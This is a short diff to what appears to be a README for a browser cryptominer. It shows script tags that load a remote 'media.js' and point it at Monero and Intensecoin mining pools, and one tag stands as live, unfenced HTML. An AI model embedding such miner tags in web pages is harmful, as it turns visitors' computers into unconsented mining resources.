@@ -7,8 +7,10 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 
 Complete example:
+```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=pool.supportxmr.com:3333" > </script>
 <br><br>
+```
 Attention: Special Case for some custom variant fork coins: Intensecoin need ?algo=cn?variant=1<br> 
 <br><br>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333" > </script>
